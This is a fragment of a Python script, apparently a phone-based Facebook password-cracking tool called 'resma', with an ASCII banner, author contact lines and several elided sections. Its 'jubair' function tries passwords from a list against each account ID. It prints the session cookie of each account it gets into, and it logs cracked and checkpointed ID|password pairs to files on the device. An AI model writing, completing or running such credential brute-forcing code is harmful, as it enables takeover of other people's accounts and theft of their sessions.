...
`7MMF'`7MM"""Yp, `7MM"""Mq.        db      `7MMF'  `7MMF'`7MMF'`7MMM.     ,MMF'    
  MM    MM    Yb   MM   `MM.      ;MM:       MM      MM    MM    MMMb    dPMM      
  MM    MM    dP   MM   ,M9      ,V^MM.      MM      MM    MM    M YM   ,M MM      
  MM    MM"""bg.   MMmmdM9      ,M  `MM      MMmmmmmmMM    MM    M  Mb  M' MM      
  MM    MM    `Y   MM  YM.      AbmmmqMA     MM      MM    MM    M  YM.P'  MM      
  MM    MM    ,9   MM   `Mb.   A'     VML    MM      MM    MM    M  `YM'   MM      
.JMML..JMMmmmd9  .JMML. .JMM..AMA.   .AMMA..JMML.  .JMML..JMML..JML. `'  .JMML.    
...
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 ...
 {gn}Facebook : ibrahim
 {gn}Taligram : no
 {gn}Tools    : {cn}resma{pn} •{gn}[{cn}version \033[1;42m{rn}•3.6•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[resma-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mresma-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[] COOKIE🌹 :\033[1;95m {coki}")
                open('/sdcard/resma-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mresma-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/resma-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
